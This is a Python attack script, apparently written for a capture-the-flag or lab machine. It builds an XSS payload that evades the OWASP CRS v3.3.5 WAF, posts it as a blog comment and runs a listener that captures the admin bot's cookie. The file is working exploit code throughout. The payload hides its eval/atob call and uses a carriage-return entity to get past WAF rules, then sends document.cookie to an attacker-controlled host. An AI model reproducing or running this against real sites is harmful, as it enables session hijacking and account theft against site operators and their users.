#!/usr/bin/env python3
"""CRS v3.3.5 XSS bypass — auto-post cookie stealer + listener.

Usage:
  python waf_hunf2.py --target http://10.81.129.60 --listener-ip 10.81.88.211
"""

from __future__ import annotations

import argparse
import base64
import datetime as dt
import http.server
import socketserver
import threading
import urllib.error
import urllib.parse
import urllib.request


# ---------------------------------------------------------------------------
# Payload builder
# ---------------------------------------------------------------------------

def build_crs_bypass_payload(listener_ip: str, listener_port: int) -> str:
    """Build the CRS v3.3.5 bypass XSS payload that steals cookies.

    The technique:
      <a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("B64"))>click</a>
    - &#x0D;  = carriage return inside "javascript" breaks regex
    - &colon; = HTML entity for ':'
    - \u0065  = unicode 'e' (for eval)
    - \u0061  = unicode 'a' (for atob)
    """
    js_code = f"document.location='http://{listener_ip}:{listener_port}/?c='+document.cookie"
    b64 = base64.b64encode(js_code.encode()).decode()

    payload = (
        '<a href=ja&#x0D;vascript&colon;'
        f'\\u0065val(\\u0061tob("{b64}"))>'
        'click me</a>'
    )
    return payload


# ---------------------------------------------------------------------------
# Listener (reused from short_listener_hunt.py, simplified)
# ---------------------------------------------------------------------------

class ExfilServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr, handler):
        super().__init__(addr, handler)
        self.hit_event = threading.Event()
        self.last_hit: dict[str, str] | None = None


class Handler(http.server.BaseHTTPRequestHandler):
    server_version = "Exfil/1.0"

    def _respond(self, code, body):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body.encode())

    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        cookie = qs.get("c", [""])[0]
        ts = dt.datetime.now().strftime("%H:%M:%S")
        src = self.client_address[0]

        print()
        print("=" * 60)
        print(f"[{ts}] HIT from {src}")
        print(f"  Path  : {self.path}")
        print(f"  Cookie: {cookie if cookie else '<empty>'}")
        print("=" * 60)

        srv = self.server
        if isinstance(srv, ExfilServer):
            srv.last_hit = {"cookie": cookie, "source": src, "path": self.path}
            srv.hit_event.set()

        self._respond(200, "ok\n")

    def log_message(self, *_a):
        pass  # suppress default logs


# ---------------------------------------------------------------------------
# POST comment
# ---------------------------------------------------------------------------

def post_comment(target_base: str, post_id: int, author: str, content: str, timeout: float = 15) -> tuple[int, str]:
    url = f"{target_base}/post/{post_id}"
    body = urllib.parse.urlencode({"author": author, "content": content}).encode()
    req = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read(500).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        preview = exc.read(500).decode("utf-8", errors="replace") if exc.fp else ""
        return exc.code, preview


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    p = argparse.ArgumentParser(description="CRS v3.3.5 XSS bypass cookie stealer")
    p.add_argument("--target", default="http://10.81.129.60", help="Target base URL")
    p.add_argument("--post-id", type=int, default=3, help="Blog post ID to comment on (default: 3)")
    p.add_argument("--listener-ip", default="10.81.88.211", help="Your AttackBox / listener IP")
    p.add_argument("--listener-port", type=int, default=8000, help="Listener port (default: 8000)")
    p.add_argument("--author", default="visitor", help="Comment author name")
    p.add_argument("--wait", type=float, default=180, help="Seconds to wait for bot callback (default: 180)")
    p.add_argument("--payload-only", action="store_true", help="Print payload and exit")
    p.add_argument("--listen-only", action="store_true", help="Only start listener, don't post")
    args = p.parse_args()

    payload = build_crs_bypass_payload(args.listener_ip, args.listener_port)

    print("[*] CRS v3.3.5 bypass payload:")
    print(payload)
    print()

    if args.payload_only:
        return 0

    # --- Start listener ---
    httpd = ExfilServer(("0.0.0.0", args.listener_port), Handler)
    srv_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    srv_thread.start()
    print(f"[*] Listener running on 0.0.0.0:{args.listener_port}")

    if not args.listen_only:
        # --- Post comment ---
        print(f"[*] Posting comment to {args.target}/post/{args.post_id} ...")
        try:
            status, preview = post_comment(args.target, args.post_id, args.author, payload)
            print(f"[*] POST response: {status}")
            if status == 403:
                print("[!] WAF blocked the payload! Try adjusting encoding.")
                httpd.shutdown()
                return 2
            if "added" in preview.lower() or "comment" in preview.lower() or status in (200, 201, 302):
                print("[+] Comment appears to be posted successfully!")
            else:
                print(f"[?] Response preview: {preview[:200]}")
        except Exception as exc:
            print(f"[!] POST failed: {exc}")
            httpd.shutdown()
            return 2

    # --- Wait for bot ---
    print(f"\n[*] Waiting up to {args.wait:.0f}s for admin bot to visit and click the link...")
    print("[*] (The admin checks the post periodically)")

    got_hit = httpd.hit_event.wait(timeout=args.wait)
    httpd.shutdown()
    httpd.server_close()

    if got_hit and httpd.last_hit:
        hit = httpd.last_hit
        cookie = hit.get("cookie", "")
        print("\n" + "#" * 60)
        print("[+] GOT CALLBACK!")
        print(f"[+] Source : {hit.get('source')}")
        print(f"[+] Cookie : {cookie}")
        print("#" * 60)
        return 0

    print("\n[-] No callback received in time.")
    print("    Tips:")
    print("    - Make sure your listener IP is reachable from the target network")
    print("    - Try posting to a different post ID (--post-id 1)")
    print("    - The bot may take a few minutes; increase --wait")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
